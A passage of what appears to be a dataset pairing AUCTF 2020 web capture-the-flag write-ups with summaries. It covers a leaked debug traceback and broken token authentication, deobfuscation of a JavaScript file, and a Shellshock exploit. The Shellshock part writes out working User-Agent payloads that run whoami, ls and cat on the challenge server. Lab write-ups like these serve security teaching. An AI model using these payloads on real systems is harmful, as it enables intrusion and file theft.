<pre class=""line before""><span class=""ws"">                </span>rv = self.dispatch_request()</pre>
<pre class=""line before""><span class=""ws"">        </span>except Exception as e:</pre>
<pre class=""line current""><span class=""ws"">            </span>rv = self.handle_user_exception(e)</pre>
<pre class=""line after""><span class=""ws"">        </span>return self.finalize_request(rv)</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws"">    </span>def finalize_request(self, rv, from_error_handler=False):</pre>
<pre class=""line after""><span class=""ws"">        </span>&quot;&quot;&quot;Given the return value from a view function this finalizes</pre>
<pre class=""line after""><span class=""ws"">        </span>the request by converting it into a response and invoking the</pre></div>
</div>

<li><div class=""frame"" id=""frame-140737347119056"">
  <h4>File <cite class=""filename"">""/usr/local/lib/python2.7/site-packages/flask/app.py""</cite>,
      line <em class=""line"">1820</em>,
      in <code class=""function"">handle_user_exception</code></h4>
  <div class=""source library""><pre class=""line before""><span class=""ws"">            </span>return self.handle_http_exception(e)</pre>
<pre class=""line before""><span class=""ws""></span> </pre>
<pre class=""line before""><span class=""ws"">        </span>handler = self._find_error_handler(e)</pre>
<pre class=""line before""><span class=""ws""></span> </pre>
<pre class=""line before""><span class=""ws"">        </span>if handler is None:</pre>
<pre class=""line current""><span class=""ws"">            </span>reraise(exc_type, exc_value, tb)</pre>
<pre class=""line after""><span class=""ws"">        </span>return handler(e)</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws"">    </span>def handle_exception(self, e):</pre>
<pre class=""line after""><span class=""ws"">        </span>&quot;&quot;&quot;Handle an exception that did not have an error handler</pre>
<pre class=""line after""><span class=""ws"">        </span>associated with it, or that was raised from an error handler.</pre></div>
</div>

<li><div class=""frame"" id=""frame-140737210047696"">
  <h4>File <cite class=""filename"">""/usr/local/lib/python2.7/site-packages/flask/app.py""</cite>,
      line <em class=""line"">1949</em>,
      in <code class=""function"">full_dispatch_request</code></h4>
  <div class=""source library""><pre class=""line before""><span class=""ws"">        </span>self.try_trigger_before_first_request_functions()</pre>
<pre class=""line before""><span class=""ws"">        </span>try:</pre>
<pre class=""line before""><span class=""ws"">            </span>request_started.send(self)</pre>
<pre class=""line before""><span class=""ws"">            </span>rv = self.preprocess_request()</pre>
<pre class=""line before""><span class=""ws"">            </span>if rv is None:</pre>
<pre class=""line current""><span class=""ws"">                </span>rv = self.dispatch_request()</pre>
<pre class=""line after""><span class=""ws"">        </span>except Exception as e:</pre>
<pre class=""line after""><span class=""ws"">            </span>rv = self.handle_user_exception(e)</pre>
<pre class=""line after""><span class=""ws"">        </span>return self.finalize_request(rv)</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws"">    </span>def finalize_request(self, rv, from_error_handler=False):</pre></div>
</div>

<li><div class=""frame"" id=""frame-140737214759056"">
  <h4>File <cite class=""filename"">""/usr/local/lib/python2.7/site-packages/flask/app.py""</cite>,
      line <em class=""line"">1935</em>,
      in <code class=""function"">dispatch_request</code></h4>
  <div class=""source library""><pre class=""line before""><span class=""ws"">            </span>getattr(rule, &quot;provide_automatic_options&quot;, False)</pre>
<pre class=""line before""><span class=""ws"">            </span>and req.method == &quot;OPTIONS&quot;</pre>
<pre class=""line before""><span class=""ws"">        </span>):</pre>
<pre class=""line before""><span class=""ws"">            </span>return self.make_default_options_response()</pre>
<pre class=""line before""><span class=""ws"">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class=""line current""><span class=""ws"">        </span>return self.view_functions[rule.endpoint](**req.view_args)</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws"">    </span>def full_dispatch_request(self):</pre>
<pre class=""line after""><span class=""ws"">        </span>&quot;&quot;&quot;Dispatches the request and on top of that performs request</pre>
<pre class=""line after""><span class=""ws"">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class=""line after""><span class=""ws"">        </span>error handling.</pre></div>
</div>

<li><div class=""frame"" id=""frame-140737210048400"">
  <h4>File <cite class=""filename"">""/web_server.py""</cite>,
      line <em class=""line"">21</em>,
      in <code class=""function"">try_login</code></h4>
  <div class=""source ""><pre class=""line before""><span class=""ws"">    </span>if not request.json or 'username' not in request.json:</pre>
<pre class=""line before""><span class=""ws"">        </span>abort(400)</pre>
<pre class=""line before""><span class=""ws"">    </span>username = request.json['username']</pre>
<pre class=""line before""><span class=""ws"">    </span>password = request.json.get(&quot;password&quot;,&quot;&quot;)</pre>
<pre class=""line before""><span class=""ws"">    </span>login_check = {&quot;username&quot;:username,&quot;password&quot;:password}</pre>
<pre class=""line current""><span class=""ws"">    </span>token = r.post(&quot;http://10.0.2.8/api/login_check&quot;,json=login_check).json()['token']</pre>
<pre class=""line after""><span class=""ws"">    </span>r_data = {&quot;status&quot;:&quot;OK&quot;, &quot;token&quot;:token}</pre>
<pre class=""line after""><span class=""ws"">    </span>return jsonify(r_data)</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws""></span>@app.route('/static/help')</pre>
<pre class=""line after""><span class=""ws""></span>def help_page():</pre></div>
</div>

<li><div class=""frame"" id=""frame-140737210047760"">
  <h4>File <cite class=""filename"">""/usr/local/lib/python2.7/site-packages/requests/api.py""</cite>,
      line <em class=""line"">112</em>,
      in <code class=""function"">post</code></h4>
  <div class=""source library""><pre class=""line before""><span class=""ws"">    </span>:param \*\*kwargs: Optional arguments that ``request`` takes.</pre>
<pre class=""line before""><span class=""ws"">    </span>:return: :class:`Response &lt;Response&gt;` object</pre>
<pre class=""line before""><span class=""ws"">    </span>:rtype: requests.Response</pre>
<pre class=""line before""><span class=""ws"">    </span>&quot;&quot;&quot;</pre>
<pre class=""line before""><span class=""ws""></span> </pre>
<pre class=""line current""><span class=""ws"">    </span>return request('post', url, data=data, json=json, **kwargs)</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws""></span>def put(url, data=None, **kwargs):</pre>
<pre class=""line after""><span class=""ws"">    </span>r&quot;&quot;&quot;Sends a PUT request.</pre>
<pre class=""line after""><span class=""ws""></span> </pre></div>
</div>

<li><div class=""frame"" id=""frame-140737219802320"">
  <h4>File <cite class=""filename"">""/usr/local/lib/python2.7/site-packages/requests/api.py""</cite>,
      line <em class=""line"">58</em>,
      in <code class=""function"">request</code></h4>
  <div class=""source library""><pre class=""line before""><span class=""ws""></span> </pre>
<pre class=""line before""><span class=""ws"">    </span># By using the 'with' statement we are sure the session is closed, thus we</pre>
<pre class=""line before""><span class=""ws"">    </span># avoid leaving sockets open which can trigger a ResourceWarning in some</pre>
<pre class=""line before""><span class=""ws"">    </span># cases, and look like a memory leak in others.</pre>
<pre class=""line before""><span class=""ws"">    </span>with sessions.Session() as session:</pre>
<pre class=""line current""><span class=""ws"">        </span>return session.request(method=method, url=url, **kwargs)</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws""></span>def get(url, params=None, **kwargs):</pre>
<pre class=""line after""><span class=""ws"">    </span>r&quot;&quot;&quot;Sends a GET request.</pre>
<pre class=""line after""><span class=""ws""></span> </pre></div>
</div>

<li><div class=""frame"" id=""frame-140737219805136"">
  <h4>File <cite class=""filename"">""/usr/local/lib/python2.7/site-packages/requests/sessions.py""</cite>,
      line <em class=""line"">508</em>,
      in <code class=""function"">request</code></h4>
  <div class=""source library""><pre class=""line before""><span class=""ws"">        </span>send_kwargs = {</pre>
<pre class=""line before""><span class=""ws"">            </span>'timeout': timeout,</pre>
<pre class=""line before""><span class=""ws"">            </span>'allow_redirects': allow_redirects,</pre>
<pre class=""line before""><span class=""ws"">        </span>}</pre>
<pre class=""line before""><span class=""ws"">        </span>send_kwargs.update(settings)</pre>
<pre class=""line current""><span class=""ws"">        </span>resp = self.send(prep, **send_kwargs)</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws"">        </span>return resp</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws"">    </span>def get(self, url, **kwargs):</pre>
<pre class=""line after""><span class=""ws"">        </span>r&quot;&quot;&quot;Sends a GET request. Returns :class:`Response` object.</pre></div>
</div>

<li><div class=""frame"" id=""frame-140737293459984"">
  <h4>File <cite class=""filename"">""/usr/local/lib/python2.7/site-packages/requests/sessions.py""</cite>,
      line <em class=""line"">618</em>,
      in <code class=""function"">send</code></h4>
  <div class=""source library""><pre class=""line before""><span class=""ws""></span> </pre>
<pre class=""line before""><span class=""ws"">        </span># Start time (approximately) of the request</pre>
<pre class=""line before""><span class=""ws"">        </span>start = preferred_clock()</pre>
<pre class=""line before""><span class=""ws""></span> </pre>
<pre class=""line before""><span class=""ws"">        </span># Send the request</pre>
<pre class=""line current""><span class=""ws"">        </span>r = adapter.send(request, **kwargs)</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws"">        </span># Total elapsed time of the request (approximately)</pre>
<pre class=""line after""><span class=""ws"">        </span>elapsed = preferred_clock() - start</pre>
<pre class=""line after""><span class=""ws"">        </span>r.elapsed = timedelta(seconds=elapsed)</pre>
<pre class=""line after""><span class=""ws""></span> </pre></div>
</div>

<li><div class=""frame"" id=""frame-140737328661136"">
  <h4>File <cite class=""filename"">""/usr/local/lib/python2.7/site-packages/requests/adapters.py""</cite>,
      line <em class=""line"">508</em>,
      in <code class=""function"">send</code></h4>
  <div class=""source library""><pre class=""line before""><span class=""ws""></span> </pre>
<pre class=""line before""><span class=""ws"">            </span>if isinstance(e.reason, _SSLError):</pre>
<pre class=""line before""><span class=""ws"">                </span># This branch is for urllib3 v1.22 and later.</pre>
<pre class=""line before""><span class=""ws"">                </span>raise SSLError(e, request=request)</pre>
<pre class=""line before""><span class=""ws""></span> </pre>
<pre class=""line current""><span class=""ws"">            </span>raise ConnectionError(e, request=request)</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws"">        </span>except ClosedPoolError as e:</pre>
<pre class=""line after""><span class=""ws"">            </span>raise ConnectionError(e, request=request)</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws"">        </span>except _ProxyError as e:</pre></div>
</div>
</ul>
  <blockquote>ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/login_check (Caused by NewConnectionError('&lt;urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0&gt;: Failed to establish a new connection: [Errno 110] Connection timed out',))</blockquote>
</div>

<div class=""plain"">
  <form action=""/?__debugger__=yes&amp;cmd=paste"" method=""post"">
    <p>
      <input type=""hidden"" name=""language"" value=""pytb"">
      This is the Copy/Paste friendly version of the traceback.  <span
      class=""pastemessage"">You can also paste this traceback into
      a <a href=""https://gist.github.com/"">gist</a>:
      <input type=""submit"" value=""create paste""></span>
    </p>
    <textarea cols=""50"" rows=""10"" name=""code"" readonly>Traceback (most recent call last):
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2463, in __call__
    return self.wsgi_app(environ, start_response)
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2449, in wsgi_app
    response = self.handle_exception(e)
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1866, in handle_exception
    reraise(exc_type, exc_value, tb)
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2446, in wsgi_app
    response = self.full_dispatch_request()
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1951, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1820, in handle_user_exception
    reraise(exc_type, exc_value, tb)
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1949, in full_dispatch_request
    rv = self.dispatch_request()
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1935, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File &quot;/web_server.py&quot;, line 21, in try_login
    token = r.post(&quot;http://10.0.2.8/api/login_check&quot;,json=login_check).json()['token']
  File &quot;/usr/local/lib/python2.7/site-packages/requests/api.py&quot;, line 112, in post
    return request('post', url, data=data, json=json, **kwargs)
  File &quot;/usr/local/lib/python2.7/site-packages/requests/api.py&quot;, line 58, in request
    return session.request(method=method, url=url, **kwargs)
  File &quot;/usr/local/lib/python2.7/site-packages/requests/sessions.py&quot;, line 508, in request
    resp = self.send(prep, **send_kwargs)
  File &quot;/usr/local/lib/python2.7/site-packages/requests/sessions.py&quot;, line 618, in send
    r = adapter.send(request, **kwargs)
  File &quot;/usr/local/lib/python2.7/site-packages/requests/adapters.py&quot;, line 508, in send
    raise ConnectionError(e, request=request)
ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/login_check (Caused by NewConnectionError('&lt;urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0&gt;: Failed to establish a new connection: [Errno 110] Connection timed out',))</textarea>
  </form>
</div>
<div class=""explanation"">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class=""nojavascript"">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class=""footer"">
        Brought to you by <strong class=""arthur"">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class=""pin-prompt"">
      <div class=""inner"">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value=""Confirm Pin"">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File ""/usr/local/lib/python2.7/site-packages/flask/app.py"", line 2463, in __call__
    return self.wsgi_app(environ, start_response)
  File ""/usr/local/lib/python2.7/site-packages/flask/app.py"", line 2449, in wsgi_app
    response = self.handle_exception(e)
  File ""/usr/local/lib/python2.7/site-packages/flask/app.py"", line 1866, in handle_exception
    reraise(exc_type, exc_value, tb)
  File ""/usr/local/lib/python2.7/site-packages/flask/app.py"", line 2446, in wsgi_app
    response = self.full_dispatch_request()
  File ""/usr/local/lib/python2.7/site-packages/flask/app.py"", line 1951, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File ""/usr/local/lib/python2.7/site-packages/flask/app.py"", line 1820, in handle_user_exception
    reraise(exc_type, exc_value, tb)
  File ""/usr/local/lib/python2.7/site-packages/flask/app.py"", line 1949, in full_dispatch_request
    rv = self.dispatch_request()
  File ""/usr/local/lib/python2.7/site-packages/flask/app.py"", line 1935, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File ""/web_server.py"", line 21, in try_login
    token = r.post(""http://10.0.2.8/api/login_check"",json=login_check).json()['token']
  File ""/usr/local/lib/python2.7/site-packages/requests/api.py"", line 112, in post
    return request('post', url, data=data, json=json, **kwargs)
  File ""/usr/local/lib/python2.7/site-packages/requests/api.py"", line 58, in request
    return session.request(method=method, url=url, **kwargs)
  File ""/usr/local/lib/python2.7/site-packages/requests/sessions.py"", line 508, in request
    resp = self.send(prep, **send_kwargs)
  File ""/usr/local/lib/python2.7/site-packages/requests/sessions.py"", line 618, in send
    r = adapter.send(request, **kwargs)
  File ""/usr/local/lib/python2.7/site-packages/requests/adapters.py"", line 508, in send
    raise ConnectionError(e, request=request)
ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/login_check (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0>: Failed to establish a new connection: [Errno 110] Connection timed out',))

-->
```

The error will leak `http://challenges.auctf.com:30023/api/login_check` endpoint. Trying to use it, you will get a ""null token"".

```
$ curl -X POST -H ""Content-Type: application/json"" -d '{""username"":""m3ssap0"",""password"":""password""}' http://challenges.auctf.com:30023/api/login_check
{
  ""token"": null
}
```

This ""token"" can be used to authenticate on other endpoints to discover and retrieve the flag file (i.e. *Broken Authentication* vulnerability in *OWASP Top 10*).

```
$ curl -X POST -H ""Content-Type: application/json"" -d '{""dir"":""."", ""token"":null}' http://challenges.auctf.com:30023/api/ftp/dir
{
  ""dir"": [
    "".dockerenv"",
    ""bin"",
    ""boot"",
    ""dev"",
    ""etc"",
    ""flag.txt"",
    ""ftp_server.py"",
    ""home"",
    ""lib"",
    ""lib64"",
    ""media"",
    ""mnt"",
    ""opt"",
    ""proc"",
    ""root"",
    ""run"",
    ""sbin"",
    ""srv"",
    ""startup.sh"",
    ""sys"",
    ""templates"",
    ""tmp"",
    ""usr"",
    ""var"",
    ""web_server.py""
  ],
  ""status"": ""OK""
}

$ curl -X POST -H ""Content-Type: application/json"" -d '{""file"":""flag.txt"", ""token"":null}' http://challenges.auctf.com:30023/api/ftp/get_file
{
  ""file_data"": ""YXVjdGZ7MHdAc3BfNnJvSzNOX0B1dGh9Cg==\n"",
  ""status"": ""OK""
}
```

The data is base64 encoded (`YXVjdGZ7MHdAc3BfNnJvSzNOX0B1dGh9Cg==`); decoding it you will find the flag.

```
auctf{0w@sp_6roK3N_@uth}
```","Connecting to the webpage you will get a message that says 'for API visit help page'.

The help page will give you the following information.

[HTML code for a webpage containing information about an FTP server API, including a list of endpoints and their corresponding HTTP methods, as well as the required parameters for each endpoint.]

Using the `/api/login` endpoint an error page will appear.

The error will leak the 'login_check' endpoint. Trying to use it, you will get a ""null token"".

This ""token"" can be used to authenticate on other endpoints to discover and retrieve the flag file.

The data is base64 encoded; decoding it you will find the flag."
"# AUCTF 2020 – gg no re

* **Category:** web
* **Points:** 50

## Challenge

> http://challenges.auctf.com:30022
> 
> A junior dev built this site but we want you to test it before we send it to production.
> 
> Author: shinigami

## Solution

Analyzing the HTML of the page, you can discover a [JavaScript script](authentication.js).

```html
<html>
  <head>
    <script>authentication.js</script>
  </head>
  <body>
    <center><h1>Nothing to see here</h1></center>
  </body>
</html>
```

The code at `http://challenges.auctf.com:30022/authentication.js` is obfuscated.

```javascript
var _0x44ff=['TWFrZSBhIEdFVCByZXF1ZXN0IHRvIC9oaWRkZW4vbmV4dHN0ZXAucGhw','aW5jbHVkZXM=','bGVuZ3Ro','bG9n'];(function(_0x43cf52,_0x44ff2a){var _0x2ad1c9=function(_0x175747){while(--_0x175747){_0x43cf52['push'](_0x43cf52['shift']());}};_0x2ad1c9(++_0x44ff2a);}(_0x44ff,0x181));var _0x2ad1=function(_0x43cf52,_0x44ff2a){_0x43cf52=_0x43cf52-0x0;var _0x2ad1c9=_0x44ff[_0x43cf52];if(_0x2ad1['UmZuYF']===undefined){(function(){var _0x4760ee=function(){var _0x335dc0;try{_0x335dc0=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x3b3b3e){_0x335dc0=window;}return _0x335dc0;};var _0x1ecd5c=_0x4760ee();var _0x51e136='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1ecd5c['atob']||(_0x1ecd5c['atob']=function(_0x218781){var _0x1c7e70=String(_0x218781)['replace'](/=+$/,'');var _0x1fccf7='';for(var _0x2ca4ce=0x0,_0x55266e,_0x546327,_0x17b8a3=0x0;_0x546327=_0x1c7e70['charAt'](_0x17b8a3++);~_0x546327&&(_0x55266e=_0x2ca4ce%0x4?_0x55266e*0x40+_0x546327:_0x546327,_0x2ca4ce++%0x4)?_0x1fccf7+=String['fromCharCode'](0xff&_0x55266e>>(-0x2*_0x2ca4ce&0x6)):0x0){_0x546327=_0x51e136['indexOf'](_0x546327);}return _0x1fccf7;});}());_0x2ad1['hdhzHi']=function(_0x5d9b5f){var _0x24b0b1=atob(_0x5d9b5f);var _0x5c5f21=[];for(var _0x390988=0x0,_0xd8eac0=_0x24b0b1['length'];_0x390988<_0xd8eac0;_0x390988++){_0x5c5f21+='%'+('00'+_0x24b0b1['charCodeAt'](_0x390988)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5c5f21);};_0x2ad1['wrYKfR']={};_0x2ad1['UmZuYF']=!![];}var _0x175747=_0x2ad1['wrYKfR'][_0x43cf52];if(_0x175747===undefined){_0x2ad1c9=_0x2ad1['hdhzHi'](_0x2ad1c9);_0x2ad1['wrYKfR'][_0x43cf52]=_0x2ad1c9;}else{_0x2ad1c9=_0x175747;}return _0x2ad1c9;};function authenticate(_0x335dc0){if(validate(_0x335dc0)){console[_0x2ad1('0x2')](_0x2ad1('0x3'));}};function validate(_0x3b3b3e){return _0x3b3b3e[_0x2ad1('0x1')]>=0x5&&_0x3b3b3e[_0x2ad1('0x0')]('$');}
```

The initial array contains base64 encoded strings.

```javascript
var _0x44ff=['TWFrZSBhIEdFVCByZXF1ZXN0IHRvIC9oaWRkZW4vbmV4dHN0ZXAucGhw','aW5jbHVkZXM=','bGVuZ3Ro','bG9n'];
```

Decoding them, you will obtain the following.

```javascript
var _0x44ff=['Make a GET request to /hidden/nextstep.php','includes','length','log'];
```

So you can discover another endpoint: `http://challenges.auctf.com:30022/hidden/nextstep.php` to contact.

```
GET /hidden/nextstep.php HTTP/1.1
Host: challenges.auctf.com:30022
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 22:51:00 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
ROT13: Znxr n CBFG erdhrfg gb /ncv/svany.cuc
Content-Length: 15
Connection: close
Content-Type: text/html; charset=UTF-8

Howdy neighbor!
```

The HTTP response contains a ROT13 encrypted message in HTTP headers that can be easily decrypted.

```
Make a POST request to /api/final.php
```

Performing the `POST` request you will get the following answer.

```
POST /api/final.php HTTP/1.1
Host: challenges.auctf.com:30022
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0
Content-Type: application/x-www-form-urlencoded

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 23:24:33 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Content-Length: 43
Connection: close
Content-Type: text/html; charset=UTF-8

Send a request with the flag variable set 
```

Changing the `POST` request with a `flag` variable set will give you the flag.

```
POST /api/final.php HTTP/1.1
Host: challenges.auctf.com:30022
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 11
Content-Type: application/x-www-form-urlencoded

flag=aaaaaa

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 23:23:19 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Content-Length: 30
Connection: close
Content-Type: text/html; charset=UTF-8

auctf{1_w@s_laZ_w1t_dis_0N3} 
```","Analyzing the HTML of the page, you can discover a authentication.js.

The code at authentication.js is obfuscated.

The initial array contains base64 encoded strings.

Decoding them, you will obtain an array with some that contains these elements: 'Make a GET request to /hidden/nextstep.php','includes','length','log'

So you can discover another endpoint: nextstep.php to contact.

The HTTP response contains a ROT13 encrypted message in HTTP headers that can be easily decrypted and says: 'Make a POST request to /api/final.php'

Performing the `POST` request you will get the following answer: 'Send a post setting the variable flag'

Changing the `POST` request with a `flag` variable set will give you the flag."
"# AUCTF 2020 – M1 Abrams

* **Category:** web
* **Points:** 977

## Challenge

> http://challenges.auctf.com:30024
> 
> We built up this server, and our security team seems pretty mad about it. See if you can find out why.
> 
> Author: shinigami

## Solution

Connecting to the URL you will find a default Apache2 installation page. The version of the server is `Apache/2.4.29 (Ubuntu)`.

Performing an enumeration will let you to discover the following.

```
user@machine:~$ sudo dirb http://challenges.auctf.com:30024/ /usr/share/dirb/wordlists/vulns/apache.txt -x /usr/share/dirb/wordlists/extensions_common.txt -w

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Apr  5 11:32:26 2020
URL_BASE: http://challenges.auctf.com:30024/
WORDLIST_FILES: /usr/share/dirb/wordlists/vulns/apache.txt
OPTION: Not Stopping on warning messages
EXTENSIONS_FILE: /usr/share/dirb/wordlists/extensions_common.txt | ()(.asp)(.aspx)(.bat)(.c)(.cfm)(.cgi)(.com)(.dll)(.exe)(.htm)(.html)(.inc)(.jhtml)(.jsa)(.jsp)(.log)(.mdb)(.nsf)(.php)(.phtml)(.pl)(.reg)(.sh)(.shtml)(.sql)(.txt)(.xml)(/) [NUM = 29]

-----------------

GENERATED WORDS: 30

---- Scanning URL: http://challenges.auctf.com:30024/ ----
+ http://challenges.auctf.com:30024/cgi-bin/ (CODE:403|SIZE:288)
+ http://challenges.auctf.com:30024/icons/ (CODE:403|SIZE:288)
+ http://challenges.auctf.com:30024/index.html (CODE:200|SIZE:10918)
+ http://challenges.auctf.com:30024/server-status (CODE:403|SIZE:288)
+ http://challenges.auctf.com:30024/server-status/ (CODE:403|SIZE:288)

-----------------
END_TIME: Sun Apr  5 11:33:49 2020
DOWNLOADED: 870 - FOUND: 5
```

Analyzing `cgi-bin/` directory will let you to discover an interesting endpoint.

```
user@machine:~$ sudo dirb http://challenges.auctf.com:30024/cgi-bin/ -w

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Apr  5 12:04:05 2020
URL_BASE: http://challenges.auctf.com:30024/cgi-bin/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Stopping on warning messages

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://challenges.auctf.com:30024/cgi-bin/ ----
+ http://challenges.auctf.com:30024/cgi-bin/scriptlet (CODE:200|SIZE:55)

-----------------
END_TIME: Sun Apr  5 12:10:22 2020
DOWNLOADED: 4612 - FOUND: 1
```

Connecting to `http://challenges.auctf.com:30024/cgi-bin/scriptlet` will give you the following.

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The scriptlet is vulnerable to [*Shellshock*](https://en.wikipedia.org/wiki/Shellshock_(software_bug)).

```
GET /cgi-bin/scriptlet HTTP/1.1
Host: challenges.auctf.com:30024
User-Agent: () { :;};echo -e ""\r\n$(/usr/bin/whoami)""
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0

HTTP/1.1 200 OK
Date: Sun, 05 Apr 2020 12:16:07 GMT
Server: Apache/2.4.29 (Ubuntu)
Connection: close
Content-Length: 89

www-data
Content-type: text/html


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

So you can use it to enumerate the root directory to find `flag.file`.

```
GET /cgi-bin/scriptlet HTTP/1.1
Host: challenges.auctf.com:30024
User-Agent: () { :;};echo -e ""\r\n$(/bin/ls /)""
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0

HTTP/1.1 200 OK
Date: Sun, 05 Apr 2020 12:19:24 GMT
Server: Apache/2.4.29 (Ubuntu)
Connection: close
Content-Length: 175

bin
boot
dev
etc
flag.file
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
Content-type: text/html


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

And then print it.

```
GET /cgi-bin/scriptlet HTTP/1.1
Host: challenges.auctf.com:30024
User-Agent: () { :;};echo -e ""\r\n$(/bin/cat /flag.file)""
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0

HTTP/1.1 200 OK
Date: Sun, 05 Apr 2020 12:20:01 GMT
Server: Apache/2.4.29 (Ubuntu)
Connection: close
Content-Length: 194

1f8b0808de36755e0003666c61672e747874004b2c4d2e49ab56c9303634
8c0fce30f08ecf358eaf72484989ace502005a5da5461b000000
Content-type: text/html


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The content of the file is the hexadecimal representation of a GZip archive (i.e. signature `1f8b08`).

This [file](flag.gz) can be re-created with an hexadecimal editor. If you open the archive you will find the `flag.txt` file with the flag.

```
auctf{$h311_Sh0K_m3_z@ddY}
```","Connecting to the URL you will find a default Apache2 installation page.

Performing an enumeration will let you to discover the following.

[Bash commands used for web application testing and exploiting vulnerabilities, including the use of the DIRB tool for directory and file enumeration, and the discovery and exploitation of a Shellshock vulnerability in a CGI script.]

So you can use it to enumerate the root directory to find `flag.file`.

And then print it.

The content of the file is the hexadecimal representation of a GZip archive.

